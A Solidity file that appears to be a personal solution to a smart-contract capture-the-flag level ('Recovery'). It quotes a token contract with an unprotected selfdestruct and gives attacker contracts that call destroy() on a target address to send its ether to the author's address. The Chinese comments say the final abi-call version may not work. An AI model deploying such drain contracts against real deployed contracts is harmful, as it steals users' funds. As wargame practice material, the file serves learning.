// // SPDX-License-Identifier: MIT
// pragma solidity ^0.6.0;

// import '@openzeppelin/contracts/math/SafeMath.sol';

// contract Recovery {

//   //generate tokens
//   function generateToken(string memory _name, uint256 _initialSupply) public {
//     new SimpleToken(_name, msg.sender, _initialSupply);
//   }
// }

// contract SimpleToken {

//   using SafeMath for uint256;
//   // public variables
//   string public name;
//   mapping (address => uint) public balances;

//   // constructor
//   constructor(string memory _name, address _creator, uint256 _initialSupply) public {
//     name = _name;
//     balances[_creator] = _initialSupply;
//   }

//   // collect ether in return for tokens   接受转账  把余额表 X10  不是累加 很奇怪 
//   receive() external payable {
//     balances[msg.sender] = msg.value.mul(10);
//   }

//   // allow transfers of tokens
//   function transfer(address _to, uint _amount) public { 
//     require(balances[msg.sender] >= _amount);
//     balances[msg.sender] = balances[msg.sender].sub(_amount);  //没有转账功能  只是维护本地表数据 
//     balances[_to] = _amount;
//   }

//   // clean up after ourselves
//   function destroy(address payable _to) public {
//     selfdestruct(_to);   //销毁  
//   }
// }
// Anyone can create new tokens with ease.
// After deploying the first token contract, the creator sent 0.001 ether to obtain more tokens. 
//They have since lost the contract address.
//This level will be completed if you can recover (or remove) the 0.001 ether from the lost contract address.

//找到SimpleToken的合约地址  然后去调用销毁函数  即可 

//0x0f869a888B3A5731C19b0c9e4F7a040bEbFAd90B


/*  解决办法 
pragma solidity ^0.6.0;

interface SimpleToken{
    function destroy(address _to) external;
}

contract attack {
    address payable target = 0x8F524c443ceaB52b5dd26ab2056Fa5A34693c784;
    address payable myaddr = 0x5D9C8273bce3F1fe86C55c4D0fD4844636279393;

    constructor() public {
        
    }

    function exploit() public{
        SimpleToken impl = SimpleToken(target);
        impl.destroy(myaddr);
    }
}
*/

// 下面的 abi 调用有问题  不知道哪里出问题了  
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract attack {
    address payable target = 0x47c25ce17508Df362A1Ad0692FFD54594A30A79f;
    address payable myaddr = 0x5D9C8273bce3F1fe86C55c4D0fD4844636279393;

    constructor() public {
        
    }

    function exploit() public{
        target.call(abi.encodeWithSignature("destroy(address)",myaddr));
        // bytes memory payload = abi.encodeWithSignature("destroy(address)", myaddr);
        // (bool success,) = target.call(payload);
    }
}